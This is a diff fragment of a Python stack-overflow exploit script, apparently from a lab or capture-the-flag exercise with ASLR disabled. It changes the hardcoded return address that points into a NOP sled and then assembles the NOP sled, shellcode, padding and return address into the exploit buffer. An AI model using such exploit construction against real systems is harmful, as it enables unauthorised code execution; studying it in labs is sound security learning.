@@ -22,9 +22,9 @@ shellcode = (
 padding = b"A" * 53
 
 # 4. Return address pointing into the NOP sled (little endian)
-# Buffer starts around 0xffffc84c with static linking in gdb
-# Pointing to 0xffffc850 (safely into NOP sled)
-ret_addr = b"\x50\xc8\xff\xff"
+# With ASLR disabled, buffer is at 0xffffc8bc during normal execution
+# Pointing to middle of NOP sled: 0xffffc8bc + 16 = 0xffffc8cc
+ret_addr = b"\xcc\xc8\xff\xff"
 
 # Construct final exploit buffer
 exploit = nop_sled + shellcode + padding + ret_addr
